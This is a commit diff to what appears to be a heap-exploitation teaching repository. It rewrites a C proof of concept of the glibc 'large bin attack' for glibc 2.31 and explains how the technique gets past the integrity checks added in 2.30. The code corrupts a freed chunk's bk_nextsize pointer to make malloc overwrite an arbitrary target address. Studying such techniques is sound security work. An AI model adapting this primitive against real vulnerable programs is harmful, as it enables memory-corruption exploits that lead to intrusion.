47f0e1624c75d19434fa1288963691b4e4a756b3
Kyle ZENG <jkjh1jkjh1@gmail.com>
2020-11-02 01:15:38 -0700

    add large_bin_attack to 2.31

--- glibc_2.31/large_bin_attack.c
+++ glibc_2.31/large_bin_attack.c
@@ -1,110 +1,91 @@
-/*
-
-    This technique is taken from
-    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/
-
-    [...]
-
-              else
-              {
-                  victim->fd_nextsize = fwd;
-                  victim->bk_nextsize = fwd->bk_nextsize;
-                  fwd->bk_nextsize = victim;
-                  victim->bk_nextsize->fd_nextsize = victim;
-              }
-              bck = fwd->bk;
-
-    [...]
-
-    mark_bin (av, victim_index);
-    victim->bk = bck;
-    victim->fd = fwd;
-    fwd->bk = victim;
-    bck->fd = victim;
-
-    For more details on how large-bins are handled and sorted by ptmalloc,
-    please check the Background section in the aforementioned link.
-
-    [...]
-
- */
-
 #include<stdio.h>
 #include<stdlib.h>
- 
-int main()
-{
-    fprintf(stderr, "This technique only works with disabled tcache-option for glibc, see glibc_build.sh for build instructions.\n");
-    fprintf(stderr, "This file demonstrates large bin attack by writing a large unsigned long value into stack\n");
-    fprintf(stderr, "In practice, large bin attack is generally prepared for further attacks, such as rewriting the "
-           "global variable global_max_fast in libc for further fastbin attack\n\n");
 
-    unsigned long stack_var1 = 0;
-    unsigned long stack_var2 = 0;
+/*
 
-    fprintf(stderr, "Let's first look at the targets we want to rewrite on stack:\n");
-    fprintf(stderr, "stack_var1 (%p): %ld\n", &stack_var1, stack_var1);
-    fprintf(stderr, "stack_var2 (%p): %ld\n\n", &stack_var2, stack_var2);
+A revisit to large bin attack for after glibc2.30
 
-    unsigned long *p1 = malloc(0x320);
-    fprintf(stderr, "Now, we allocate the first large chunk on the heap at: %p\n", p1 - 2);
+Relevant code snippet :
 
-    fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"
-           " the first large chunk during the free()\n\n");
-    malloc(0x20);
+	if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk)){
+		fwd = bck;
+		bck = bck->bk;
+		victim->fd_nextsize = fwd->fd;
+		victim->bk_nextsize = fwd->fd->bk_nextsize;
+		fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
+	}
 
-    unsigned long *p2 = malloc(0x400);
-    fprintf(stderr, "Then, we allocate the second large chunk on the heap at: %p\n", p2 - 2);
 
-    fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"
-           " the second large chunk during the free()\n\n");
-    malloc(0x20);
+*/
 
-    unsigned long *p3 = malloc(0x400);
-    fprintf(stderr, "Finally, we allocate the third large chunk on the heap at: %p\n", p3 - 2);
- 
-    fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the top chunk with"
-           " the third large chunk during the free()\n\n");
-    malloc(0x20);
- 
-    free(p1);
-    free(p2);
-    fprintf(stderr, "We free the first and second large chunks now and they will be inserted in the unsorted bin:"
-           " [ %p <--> %p ]\n\n", (void *)(p2 - 2), (void *)(p2[0]));
+int main(){
+  /*Disable IO buffering to prevent stream from interfering with heap*/
+  setvbuf(stdin,NULL,_IONBF,0);
+  setvbuf(stdout,NULL,_IONBF,0);
+  setvbuf(stderr,NULL,_IONBF,0);
 
-    malloc(0x90);
-    fprintf(stderr, "Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the"
-            " freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation"
-            ", and reinsert the remaining of the freed first large chunk into the unsorted bin:"
-            " [ %p ]\n\n", (void *)((char *)p1 + 0x90));
+  printf("\n\n");
+  printf("Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n");
+  printf("Check 1 : \n");
+  printf(">    if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))\n");
+  printf(">        malloc_printerr (\"malloc(): largebin double linked list corrupted (nextsize)\");\n");
+  printf("Check 2 : \n");
+  printf(">    if (bck->fd != fwd)\n");
+  printf(">        malloc_printerr (\"malloc(): largebin double linked list corrupted (bk)\");\n\n");
+  printf("This prevents the traditional large bin attack\n");
+  printf("However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n");
+  
+  printf("====================================================================\n\n");
 
-    free(p3);
-    fprintf(stderr, "Now, we free the third large chunk and it will be inserted in the unsorted bin:"
-           " [ %p <--> %p ]\n\n", (void *)(p3 - 2), (void *)(p3[0]));
- 
-    //------------VULNERABILITY-----------
+  size_t target = 0;
+  printf("Here is the target we want to overwrite (%p) : %llu\n\n",&target,target);
+  size_t *p1 = malloc(0x428);
+  printf("First, we allocate a large chunk [p1] (%p)\n",p1-2);
+  size_t *g1 = malloc(0x18);
+  printf("And another chunk to prevent consolidate\n");
 
-    fprintf(stderr, "Now emulating a vulnerability that can overwrite the freed second large chunk's \"size\""
-            " as well as its \"bk\" and \"bk_nextsize\" pointers\n");
-    fprintf(stderr, "Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk"
-            " at the head of the large bin freelist. To overwrite the stack variables, we set \"bk\" to 16 bytes before stack_var1 and"
-            " \"bk_nextsize\" to 32 bytes before stack_var2\n\n");
+  printf("\n");
 
-    p2[-1] = 0x3f1;
-    p2[0] = 0;
-    p2[2] = 0;
-    p2[1] = (unsigned long)(&stack_var1 - 2);
-    p2[3] = (unsigned long)(&stack_var2 - 4);
+  size_t *p2 = malloc(0x418);
+  printf("We also allocate a second large chunk [p2]  (%p).\n",p2-2);
+  printf("This chunk should be smaller than [p1] and belong to the same large bin.\n");
+  size_t *g2 = malloc(0x18);
+  printf("Once again, allocate a guard chunk to prevent consolidate\n");
 
-    //------------------------------------
+  printf("\n");
 
-    malloc(0x90);
- 
-    fprintf(stderr, "Let's malloc again, so the freed third large chunk being inserted into the large bin freelist."
-            " During this time, targets should have already been rewritten:\n");
+  free(p1);
+  printf("Free the larger of the two --> [p1] (%p)\n",p1-2);
+  size_t *g3 = malloc(0x438);
+  printf("Allocate a chunk larger than [p1] to insert [p1] into large bin\n");
 
-    fprintf(stderr, "stack_var1 (%p): %p\n", &stack_var1, (void *)stack_var1);
-    fprintf(stderr, "stack_var2 (%p): %p\n", &stack_var2, (void *)stack_var2);
+  printf("\n");
 
-    return 0;
+  free(p2);
+  printf("Free the smaller of the two --> [p2] (%p)\n",p2-2);
+  printf("At this point, we have one chunk in large bin [p1] (%p),\n",p1-2);
+  printf("               and one chunk in unsorted bin [p2] (%p)\n",p2-2);
+
+  printf("\n");
+
+  p1[3] = (size_t)((&target)-4);
+  printf("Now modify the p1->bk_nextsize to [target-0x20] (%p)\n",(&target)-4);
+
+  printf("\n");
+
+  size_t *g4 = malloc(0x438);
+  printf("Finally, allocate another chunk larger than [p2] to place [p2] into large bin\n");
+  printf("Since glibc does not check chunk->bk_nextsize if the new inserted chunk is smaller than smallest,\n");
+  printf("  the modified p1->bk_nextsize does not trigger any error\n");
+  printf("Upon inserting [p2] into largebin, [p1]->bk_nextsize->fd->nexsize is overwritten to address of [p2]\n");
+
+  printf("\n");
+
+  printf("In out case here, target is now overwritten to address of [p2]\n",target);
+  printf("Target (%p) : %p\n",&target,(size_t*)target);
+
+  printf("\n");
+  printf("====================================================================\n\n");
+
+  return 0;
 }
